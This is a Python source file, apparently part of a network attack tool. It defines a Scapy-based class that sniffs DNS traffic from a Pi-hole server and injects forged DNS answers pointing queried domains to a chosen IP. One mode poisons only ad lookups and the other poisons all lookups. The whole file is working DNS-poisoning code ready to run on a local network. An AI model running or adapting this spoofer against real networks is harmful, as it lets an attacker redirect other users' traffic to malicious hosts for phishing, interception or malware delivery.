from scapy.all import *

class Dns:
    'Dns class handles the DNS spoofing for all responses from Pi-hole'
    
    piIP = ""
    resultIP = ""
    verbose = False
    poisonType = ""
    interface = ''
    
    def __init__(self, piIP, resultIP, poisonType, interface, verbose):
        self.piIP = piIP
        self.resultIP = resultIP
        self.interface = interface
        self.verbose = verbose
        return

    # DNS query sniffer
    def querysniff(self, pkt):

        # If DNS layer exists AND
        # if source is pihole AND
        # there is an answer AND
        # the answer is a valid IP AND
        if pkt.haslayer(DNS) \
                and pkt[IP].src == self.piIP \
                and pkt[DNS].an \
                and self.ip_checker(pkt[DNS].an.rdata):

            # Poison only the ads
            if self.poisonType == 'ads':
                if pkt[DNS].an.rdata == self.piIP:
                    resIP = pkt[IP]
                    resUDP = pkt[UDP]
                    resDNS = pkt[DNS]

                    spoofed_ip = IP(src=resIP.src, dst=resIP.dst)
                    spoofed_udp = UDP(sport=resUDP.sport, dport=resUDP.dport)
                    spoofed_dnsrr = DNSRR(rrname=resDNS.qd.qname, rdata=self.resultIP)
                    spoofed_dns = DNS(qr=1, id=resDNS.id, qd=resDNS.qd, an=spoofed_dnsrr)

                    spoofed_pkt = spoofed_ip/spoofed_udp/spoofed_dns
                    if self.verbose:
                        print("Spoofed domain " + resDNS.qd.qname.decode('utf-8'))
                    send(spoofed_pkt, verbose=False)

            # Poison everything
            else:
                resIP = pkt[IP]
                resUDP = pkt[UDP]
                resDNS = pkt[DNS]

                spoofed_ip = IP(src=resIP.src, dst=resIP.dst)
                spoofed_udp = UDP(sport=resUDP.sport, dport=resUDP.dport)
                spoofed_dnsrr = DNSRR(rrname=resDNS.qd.qname, rdata=self.resultIP)
                spoofed_dns = DNS(qr=1, id=resDNS.id, qd=resDNS.qd, an=spoofed_dnsrr)

                spoofed_pkt = spoofed_ip / spoofed_udp / spoofed_dns
                if self.verbose:
                    print("Spoofed domain " + resDNS.qd.qname.decode('utf-8'))
                send(spoofed_pkt, verbose=False)
        else:
            pass
            # Allow other traffic
            #send(pkt, verbose=False)

    def ip_checker(self, ip):
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) < 256 for part in parts)
        except ValueError:
            return False # One of the "parts" cannot be casted as int
        except(AttributeError, TypeError):
            return False # ip is not a string

    def poison(self):
        print("DNS poisoning...")
        print("Press CTRL+C to exit")
        sniff(iface=self.interface, filter='udp port 53', prn=self.querysniff, store=0)